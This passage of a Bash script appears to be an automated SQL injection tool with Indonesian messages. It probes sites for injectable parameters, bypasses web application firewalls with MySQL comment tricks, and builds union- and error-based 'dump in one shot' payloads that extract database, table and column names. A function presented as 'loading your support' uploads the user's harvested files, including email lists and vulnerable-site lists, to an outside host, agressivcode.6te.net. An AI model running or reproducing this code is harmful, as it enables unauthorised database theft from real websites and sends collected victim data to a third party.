             curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$param11%27$param21" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site2
             curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$param11%27--%20-$param21" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site3
    else
          if [[ "$based64" = "y" ]]
          then
            st1=$(echo "`cut -d "=" -f1 <<< $site`=" )
            bs41=$(echo "1%27" | base64 -i)
            bs42=$(echo "1%27--+" | base64 -i)
            curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$st1" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site
            curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$st1$bs41" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site2
            curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$st1$bs42" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site3
          else
             if [[ "$postd" = "y" ]]; then
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sLX POST "$site" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sLX POST "$site" --data "$postnya=null%27" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site2
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sLX POST "$site" --data "$postnya=null%27--+" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site3
             else
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site%27" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site2
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site%27--+" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site3
             fi
         fi
    fi
    bla=$(diff -u .site .site2)
    if [[ "$bla" = "" ]]
    then
       echo -ne "\anot vuln\n${N}[${R}\033[7mCRITICAL${N}] ${R}\033[2mNOT FOUND gagal mencari error page ${N}\n${N}[${R}*${N}] ${R}\033[2mmau paksa inject ?? y/n "
       read paksa
       if [[ "$paksa" = "y" ]]
       then
           union=$(echo "$union" | sed "s/'//g" | sed "s/%27//g")
           echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}\033[2mUNION based injection method${N}"
           inject
           if cat .tmp | grep "$order_by" >/dev/null
             then
              echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] $G\033[2mSTRING BASED try to string based injection method$N"
              union="%27$union"
              echo -e "$site" >/dev/null
              inject
              if echo $i | grep "$order_by" >/dev/null
              then
                 echo -en "\x1b[0m${N}[${BL}`date +%T`${N}] union method gagal coba error based y/n"
                 read lot
                 if [[ "$lot" = "y" ]]; then
                    echo -en "\x1b[0m${N}[${BL}`date +%T`${N}] ${R}\033[2mERROR based injection$N\n\x1b[0m${N}[${O}\033[2m`date +%T`${N}] \033[2mERROR BASED Injection${N}"
                    esql
                 fi
              fi
           fi
        else
           echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}coba inject manual"
        fi
    else
       echo -e "vuln sqli found"
       blas=$(diff -u .site .site3)
       if [[ "$blas" = "" ]]
       then
           echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}\033[2mSTRING based injection method ${N}"
           union="%27$union"
           inject
           if cat .tmp | grep "$order_by" >/dev/null
           then
              echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${G}\033[2mUNION based injection method${N}"
              union=$(echo "$union" | sed "s/'//g" | sed "s/%27//g")
              echo -e "$site" >/dev/null
              inject
              if echo $i | grep "$order_by" >/dev/null
              then
                 echo "$site" >> $error_site
                 echo -en "\x1b[0m${N}[${BL}`date +%T`${N}] union method gagal coba error based saved ${G}$error_site\n\x1b[0m${N}[${O}\033[2m`date +%T`${N}] \033[2mERROR BASED Injection${N}"
                 esql
              fi
           fi
       else
           union=$(echo "$union" | sed "s/'//g" | sed "s/%27//g")
           if [[ "$debug" = "s" ]];then
              echo "developer mode string based"
              union="%27$union"
           else
              echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}\033[2mUNION based injection method${N}"
           fi
           inject
           if cat .tmp | grep "$order_by" >/dev/null
             then
              echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${G}\033[2mSTRING BASED try to string based injection method$N"
              union="%27$union"
              echo -e "$site" >/dev/null
              inject
              if echo $i | grep "$order_by" >/dev/null
              then
                 echo "$site" >> $error_site
                 echo -en "\x1b[0m${N}[${BL}`date +%T`${N}] union method gagal coba error based saved ${G}$error_site\n\x1b[0m${N}[${O}\033[2m`date +%T`${N}] \033[2mERROR BASED Injection${N}"
                 esql
              fi
           fi
       fi
    fi

}
info() {
  #echo -e "$by \n $waff"
   lcvs="n"
   sp="/-|"
   sc=0
   if [[ "$dump_name" = "y" ]];then
    if [[ "$waff" = "on" ]];then
    if [[ "$by"  = "$w3" ]];then
       ddbs="(select+group_concat(0x3c6c693e,/*!50000schema_name*/,0x3c6c693e)+/*!50000from*/+/*!50000information_schema.schemata*/)"
    else
       ddbs9="(select+group_concat${by}(0x3c6c693e,schema_name,0x3c6c693e)+${by}from${by}+${by}information_schema.schemata${by})"
    fi
  fi
   for us in $Dump_db $ddbs $ddbs1 $ddbs2 $ddbs9 oi
   do
   if [[ "$us" = "oi" ]];then
      echo -e "${O}\033[2mGagal ambil nama db langsung dios${N}"
      lcvs="n"
      dump_sqli="n"
      dios
   else
   echo -e "$angka" |  sed 's/kedjaw3n//g' | grep -a -o '[0-9]' > .angka
   if cat .angka >/dev/null
   then
      if echo $ngecur | grep -Po "where clause" >/dev/null
      then
        df=$(echo $ngecur | grep -Po "kedjaw3n[0-9]*" | sed 's/kedjaw3n//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'kedjaw3n[0-9]*' > .angka
        cat .angka |  sed 's/kedjaw3n//g' > .angka
      fi
    if [[ "$based64" = "y" ]]
    then
       its=$(echo -e "$colom-- -" | sed 's/0x6b65646a6177336e3//g')
    else
       its=$(echo -e "$colom--+" | sed 's/0x6b65646a6177336e3//g')
    fi
    if [[ "$i" = `cat .angka | sort -r` ]];then
       in=$(cat .angka | tail -1)
    else
       if cat .angka | wc -l | grep 3 >/dev/null
       then
          in=$(cat .angka | sort | tail -2 | head -1)
       else
          in=$(cat .angka | sort | tail -3 | head -1)
       fi
       _in=$(cat .angka | sort -r | sed '1 s/^.*$//' | sed "/^$/d" | head -1)
    fi
    if [[ "$based64" = "y" ]]
    then
       st=$(echo "`cut -d "=" -f1 <<< $site`=" )
       if [[ "$corona" = "y" ]];then
         base44=$(sed "s#${in}#$us#g" <<< $its | sed "s/,,/,/g")
       else
         if [[ "$in" = "$i" ]];then
            base44=$(sed "s#,${in}#,$us#g" <<< $its | sed "s/,,/,/g")
         else
            base44=$(sed "s#,${in},#,$us,#g" <<< $its | sed "s/,,/,/g")
         fi
       fi
       bs9=$(echo "null$union$base44")
       bs57=$(echo "$bs9" | base64 -i)
       base94=$(echo "$st$bs57" | tr -d "\n")
       if [[ "$debug" = "y" ]];then
          echo -e " $base44 \n $bs9 \n $bs57"
       fi
       dbnya=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out "$base94" -s -L | grep -Po '<li>[^<]*<li>|(?<=li&gt;)[^&]*(?=&lt;li)|Forbidden|forbidden|Not Acceptable|Internal Server Error' | cut -d "<" -f2 | sed 's/li>//g' | tr -d ',' | tr -d '\0' | sed 's/\r$//')
       echo -e "${O}Get db_name: ${N}\033[2m$base94"
    else #php
       if [[ "$html" = "y" ]]
       then
          if [[ "$corona" = "y" ]];then
             db=$(sed "s#${in}#$us#g" <<< $its | sed "s/,,/,/g")
          else
             if [[ "$in" = "$i" ]];then
                db=$(sed "s#,${in}#,$us#g" <<< $its | sed "s/,,/,/g")
             else
                db=$(sed "s#,${in},#,$us,#g" <<< $its | sed "s/,,/,/g")
             fi
          fi
          dk=$(echo -e "$param1$union$db$param2")
       else
          if [[ "$corona" = "y" ]];then
             db=$(sed "s#${in}#$us#g" <<< $its | sed "s/,,/,/g")
          else
             if [[ "$in" = "$i" ]];then
                db=$(sed "s#,${in}#,$us#g" <<< $its | sed "s/,,/,/g")
             else
                db=$(sed "s#,${in},#,$us,#g" <<< $its | sed "s/,,/,/g")
             fi
          fi
          dk=$(echo -e "$site$union$db")
       fi
       if [[ "$postd" = "y" ]]
       then
          dk=$(echo -e "$union$db")
          dbnya=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$dk" | grep -Po '<li>[^<]*<li>|(?<=li&gt;)[^&]*(?=&lt;li)|Forbidden|forbidden|Not Acceptable|Internal Server Error' | cut -d "<" -f2 | sed 's/li>//g' |  tr -d ',' | tr -d '\0' | sed 's/\r$//')
          echo -e "${O}Get db_name: ${N}\033[2m$postnya=null$dk"
       else
          dbnya=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out "$dk" -s -L | grep -Po '<li>[^<]*<li>|(?<=li&gt;)[^&]*(?=&lt;li)|Forbidden|forbidden|Not Acceptable|Internal Server Error' | cut -d "<" -f2 | sed 's/li>//g' |  tr -d ',' | tr -d '\0' | sed 's/\r$//')
          echo -e "${O}Get db_name: ${N}\033[2m$dk"
       fi
    fi
       else
        echo -e "${N}[${R}INFO${N}] ${R}gagal ambil info server"
    fi
    if echo "$dbnya" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
       echo -e "${O}\033[2mWAFF Blocked: ${R}`echo "$dbnya" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
       continue
    fi
    echo "$dbnya" > .db
    ff=$(cat .db)
            if [[ "$ff" = "" ]]
            then
              echo -e "${R}\033[2mFAILED mengambil nama db${N}"
            else
              dbdir=$(echo "$info" | grep -Po 'Database: [[:alnum:][:punct:]]*' | cut -d " " -f2)
              if [[ -z $dbdir ]];then
                 db_dir="null"
              fi
              if [[ -z $db_na ]];then
                 db_na="null"
              fi
              echo -e "${N}retrived_db: ${G}mysql@$dbdir${N}~ "
              cat .db | sort -u | uniq -i | sed "s/^/~ /g"
              if [[ "$boot_empas" = "y" ]];then
              	for db_ro in $(cat .db | sort -u | uniq -i)
              	do
                   if [[ "$corect" = "y" ]];then
                      db_root=$(grep -nH -m 1 -R "$db_ro" .db | head -1 | cut -d ":" -f3)
                   else
                      db_root="$db_ro"
                   fi
                   if  [[ "$db_ro" = "" ]]
                   then
                      echo -e "${N}\033[2mDatabase yg dimasukan kosong langsung dios${N}"
                      dump_sqli="n"
                      hex="database/**8**/()"
                      dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
                      dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios
                   fi
                   if echo "$db_ro" | grep -Po "dio|DIOS|dios|Dios|DIos|dios" >/dev/null
                   then
                      echo -e "${N}\033[2mDump in One shoot${N}"
                      dump_sqli="n"
                      hex="database/**8**/()"
                      dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
                      dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios
                   fi
                   if cat .db | grep -Po "$db_ro" >/dev/null
                   then
                      db_na=$(cat .db | grep -Po "$db_root" | sort -u | uniq -i)
                      if [[ -z $dbdir ]];then
                         db_dir="null"
                      fi
                      if [[ -z $db_na ]];then
                         db_na="null"
                      fi
                      echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na${N}~\n"
                      dump_sqli="y"
                      echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"
                      asx="$db_na"
                      hex=$(for ((ihex=0;ihex<${#asx};ihex++));do printf %02X \'${asx:$ihex:1};done)
                      hex=$(echo "0x$hex")
                      dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
                      dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios
                   fi
                done
                break
          else
              echo -e "${R}~${N} dios"
              echo -en "Dump Db: ${O}"
              read db_ro
              if [[ "$corect" = "y" ]];then
                 db_root=$(grep -nH -m 1 -R "$db_ro" .db | head -1 | cut -d ":" -f3)
              else
                 db_root="$db_ro"
              fi
              if  [[ "$db_ro" = "" ]]
              then
                 echo -e "${N}\033[2mDatabase yg dimasukan kosong langsung dios${N}"
                 dump_sqli="n"
                 hex="database/**8**/()"
                 dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                 dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
                 dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                 dios
              fi
              if echo "$db_ro" | grep -Po "dio|DIOS|dios|Dios|DIos|dios" >/dev/null
              then
                 echo -e "${N}\033[2mDump in One shoot${N}"
                 dump_sqli="n"
                 hex="database/**8**/()"
                 dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                 dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
                 dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                 dios
              fi
              if cat .db | grep -Po "$db_ro" >/dev/null
              then
                 db_na=$(cat .db | grep -Po "$db_root" | sort -u | uniq -i)
                 if [[ -z $dbdir ]];then
                    db_dir="null"
                 fi
                 if [[ -z $db_na ]];then
                    db_na="null"
                 fi
                 echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na${N}~\n"
                 dump_sqli="y"
                 echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"
                 asx="$db_na"
                 hex=$(for ((ihex=0;ihex<${#asx};ihex++));do printf %02X \'${asx:$ihex:1};done)
                 hex=$(echo "0x$hex")
                 dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                 dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
                 dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                 dios
              fi
              break
            fi;fi
          fi
  done;endspin
    else
      if [[ "$by" = "$w3" ]];then
         us2="${by}concat${w3a}/**8**/(0x6b65646a6177336e2656657273696f6e3a,${by}version${w3a}/**8**/(),0x2655736572207365727665723a20,${by}user${w3a}/**8**/(),0x2644617461626173653a20,${by}database${w3a}/**8**/(),0x3c6b6564)"
      else
         us2="concat${by}/**8**/(0x6b65646a6177336e2656657273696f6e3a,version${by}/**8**/(),0x2655736572207365727665723a20,user${by}/**8**/(),0x2644617461626173653a20,database${by}/**8**/(),0x3c6b6564)"
      fi
      us1="concat(0x6b65646a6177336e2656657273696f6e3a,/*!50000@@version*/,0x2655736572207365727665723a20,user(),0x2644617461626173653a20,database(),0x3c6b6564)"
   echo -e "$angka" |  sed 's/kedjaw3n//g' | grep -a -o '[0-9]' > .angka
   if cat .angka >/dev/null
   then
      if echo $ngecur | grep -Po "where clause" >/dev/null
      then
        df=$(echo $ngecur | grep -Po "kedjaw3n[0-9]*" | sed 's/kedjaw3n//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'kedjaw3n[0-9]*' > .angka
        cat .angka |  sed 's/kedjaw3n//g' > .angka
      fi
    if [[ "$based64" = "y" ]]
    then
       its=$(echo -e "$colom-- -" | sed 's/0x6b65646a6177336e3//g')
    else
       its=$(echo -e "$colom--+" | sed 's/0x6b65646a6177336e3//g')
    fi
    if [[ "$i" = `cat .angka | sort -r` ]];then
       in=$(cat .angka | tail -1)
    else
       if cat .angka | wc -l | grep 3 >/dev/null
       then
         in=$(cat .angka | sort | tail -2 | head -1)
       else
         in=$(cat .angka | sort | tail -3 | head -1)
       fi
       _in=$(cat .angka | sort -r | sed '1 s/^.*$//' | sed "/^$/d" | head -1)
    fi
   for us in $us2 $us1
   do
    if [[ "$based64" = "y" ]]
    then
       st=$(echo "`cut -d "=" -f1 <<< $site`=" )
       if [[ "$corona" = "y" ]];then
         base44=$(sed "s#${in}#$us#g" <<< $its | sed "s/,,/,/g")
       else
         if [[ "$in" = "$i" ]];then
            base44=$(sed "s#,${in}#,$us#g" <<< $its | sed "s/,,/,/g")
         else
            base44=$(sed "s#,${in},#,$us,#g" <<< $its | sed "s/,,/,/g")
         fi
       fi
       bs9=$(echo "null$union$base44")
       bs57=$(echo "$bs9" | tr -d "+" | base64 -i)
       base94=$(echo "$st$bs57" | tr -d "\n")
       if [[ "$debug" = "y" ]];then
          echo -e " $base44 \n $bs9 \n $bs57" #test
       fi
       info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base94" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d' | tr -d '\0' | sed 's/\r$//')
    else #php
       if [[ "$html" = "y" ]]
       then
          if [[ "$corona" = "y" ]];then
             db=$(sed "s#${in}#$us#g" <<< $its | sed "s/,,/,/g")
          else
             if [[ "$in" = "$i" ]];then
                db=$(sed "s#,${in}#,$us#g" <<< $its | sed "s/,,/,/g")
             else
                db=$(sed "s#,${in},#,$us,#g" <<< $its | sed "s/,,/,/g")
             fi
          fi
          dk=$(echo -e "$param1$union$db$param2")
       else
          if [[ "$corona" = "y" ]];then
             db=$(sed "s#${in}#$us#g" <<< $its | sed "s/,,/,/g")
          else
             if [[ "$in" = "$i" ]];then
                if [[ "$debug" = "y" ]];then
                   echo "aokaokwakoakok"
                fi
                db=$(sed "s#,${in}#,$us#g" <<< $its | sed "s/,,/,/g")
             else
                db=$(sed "s#,${in},#,$us,#g" <<< $its | sed "s/,,/,/g")
             fi
          fi
          dk=$(echo -e "$site$union$db")
       fi
       if [[ "$debug" = "y" ]];then
                   echo -e "its: $its\n in : $in\n dk:$dk"
                fi
       if [[ "$postd" = "y" ]]
       then
          dk=$(echo -e "$union$db")
          info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$dk" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d' | tr -d '\0' | sed 's/\r$//')
       else
          info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$dk" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d' | tr -d '\0' | sed 's/\r$//')
       fi
       if echo "$info" | grep -Po "Database" >/dev/null;then
          echo "$info" > output/$dir/info.txt
          break
       else
          echo -e "${O}\033[2mWAFF Blocked: ${R}Forbiden${N}\n${O}get info bypassing"
       fi
    fi
  done
       else
        echo -e "${N}[${R}INFO${N}] ${R}gagal ambil info server"
    fi
   fi
}
configurasi() {
	echo -en "${N}\033[2mLoading your support in prosess..."
	tanggal=$(date)
	bit1=$(cat injected.txt 2>/dev/null | sort -u | uniq -i | sed "s/&/\&/g" )
	bit2=$(echo -e "Date: $tanggal\n\n$bit1\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "agressivcode.6te.net/config/edit.php?p=injected-$pengguna" -X POST -d "newd=${bit2}" >/dev/null
	echo -n "."
	bit3=$(cat gmail.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
	bit4=$(echo -e "Date: $tanggal\n\n$bit3\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "agressivcode.6te.net/config/edit.php?p=gmail-$pengguna" -X POST -d "newd=${bit4}" >/dev/null
	echo -n "."
	bit5=$(cat yahoo.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
	bit6=$(echo -e "Date: $tanggal\n\n$bit5\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "agressivcode.6te.net/config/edit.php?p=yahoo-$pengguna" -X POST -d "newd=${bit6}" >/dev/null
	echo -n "."
	bit7=$(cat hotmail.txt 2>/dev/null | sort -u | uniq -i)
	bit8=$(echo -e "Date: $tanggal\n\n$bit7\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	echo -en "\033[2m\ntunggu sebentar..."
	curl -s "agressivcode.6te.net/config/edit.php?p=hotmail-$pengguna" -X POST -d "newd=${bit8}" >/dev/null
	echo -n "."
	bit9=$(cat aol.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
	bit10=$(echo -e "Date: $tanggal\n\n$bit9\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "agressivcode.6te.net/config/edit.php?p=aol-$pengguna" -X POST -d "newd=${bit10}" >/dev/null
	echo -n "."
	bit11=$(cat vuln.txt 2>/dev/null | sort -u | uniq -i)
	bit12=$(echo -e "Date: $tanggal\n\n$bit11\n" | sort -u | uniq -i | sed "s/&/%26/g" )
	curl -s "agressivcode.6te.net/config/edit.php?p=vuln-$pengguna" -X POST -d "newd=${bit12}" >/dev/null
	echo -n "."
	echo -en "\033[2m\nsuccess!!\n"
}
dios() {
  #echo -e "$by \n$waff"
  if cat .angka >/dev/null
  then
    if echo $ngecur | grep -Po "Unknown column 'kedjaw3n[0-9]*'" >/dev/null
    then
        df=$(echo $ngecur | grep -Po "kedjaw3n[0-9]*" | sed 's/kedjaw3n//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'kedjaw3n[0-9]*' > .angka
        cat .angka |  sed 's/kedjaw3n//g' > .angka
    fi
  if [[ "$based64" = "y" ]]
  then
     i2=$(echo -e "$colom-- -" | sed 's/0x6b65646a6177336e3//g')
  else
     i2=$(echo -e "$colom--+" | sed 's/0x6b65646a6177336e3//g')
  fi
  if [[ "$i" = `cat .angka | sort -r` ]];then
       in=$(cat .angka | tail -1)
  else
    if cat .angka | wc -l | grep 3 >/dev/null
    then
      in=$(cat .angka | sort | tail -2 | head -1)
    else
      in=$(cat .angka | sort | tail -3 | head -1)
    fi
       _in=$(cat .angka | sort -r | sed '1 s/^.*$//' | sed "/^$/d" | head -1)
  fi
  if [[ "$lcvs" = "y" ]]
  then
    if echo "$union" | grep -Po "%27|'" >/dev/null;then
       stringna="y"
       union=$(echo -e "$union" | sed "s/%27//g" | sed "s/'//g")
       site="$site%27"
    fi
    unionpo=$(echo -e "$union" | cut -d "+" -f2)
    union=$(echo -e "+$unionpo")
    if [[ "$dump_sqli" = "y" ]];then
        asx="$db_na"
        hex=$(for ((ihex=0;ihex<${#asx};ihex++));do printf %02X \'${asx:$ihex:1};done)
        if echo "$db_ro" | grep -Po "dios" >/dev/null;then
           hex="database/**8**/()"
        else
           hex=$(echo "0x$hex")
        fi
         dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
